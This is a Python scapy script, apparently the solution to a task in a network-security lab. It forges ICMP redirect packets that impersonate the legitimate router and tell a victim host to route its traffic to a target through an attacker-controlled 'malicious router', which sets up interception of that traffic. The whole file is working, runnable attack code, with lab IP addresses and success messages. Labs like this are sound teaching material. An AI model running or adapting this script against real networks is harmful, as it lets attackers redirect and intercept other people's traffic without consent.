#!/usr/bin/env python3
"""
ICMP Redirect Attack - Task 1
Sends spoofed ICMP redirect messages to redirect victim traffic through malicious router.
"""

from scapy.all import IP, ICMP, send

# Lab topology (from environment)
VICTIM_IP = "10.9.0.5"
TARGET_IP = "192.168.60.5"
LEGITIMATE_ROUTER = "192.168.60.11"  # Router on target subnet
MALICIOUS_ROUTER = "10.9.0.111"

# ICMP Redirect: type=5, code=0 (network redirect) or code=1 (host redirect)
ICMP_REDIRECT_TYPE = 5
ICMP_REDIRECT_CODE = 0


def send_icmp_redirect():
    """
    Craft and send ICMP redirect packet.
    Spoofs as the legitimate router, telling victim to use malicious router for 192.168.60.5.
    """
    # Outer IP: spoofed as router, sent to victim
    ip = IP(src=LEGITIMATE_ROUTER, dst=VICTIM_IP)
    # ICMP redirect message
    icmp = ICMP(type=ICMP_REDIRECT_TYPE, code=ICMP_REDIRECT_CODE)
    icmp.gw = MALICIOUS_ROUTER

    # Enclosed IP packet: must match traffic victim is sending (e.g., to 192.168.60.5)
    # In container env: victim should ping 192.168.60.5 first for redirect to be accepted
    ip2 = IP(src=VICTIM_IP, dst=TARGET_IP)
    # Enclosed payload: ICMP echo (ping) - matches victim's ping packet
    send(ip / icmp / ip2 / ICMP())


if __name__ == "__main__":
    print("[*] Sending ICMP redirect to victim...")
    print(f"    Victim: {VICTIM_IP} -> Target: {TARGET_IP}")
    print(f"    Redirecting via: {MALICIOUS_ROUTER}")
    send_icmp_redirect()
    print("[+] Done. Victim's routing cache should now route via malicious router.")
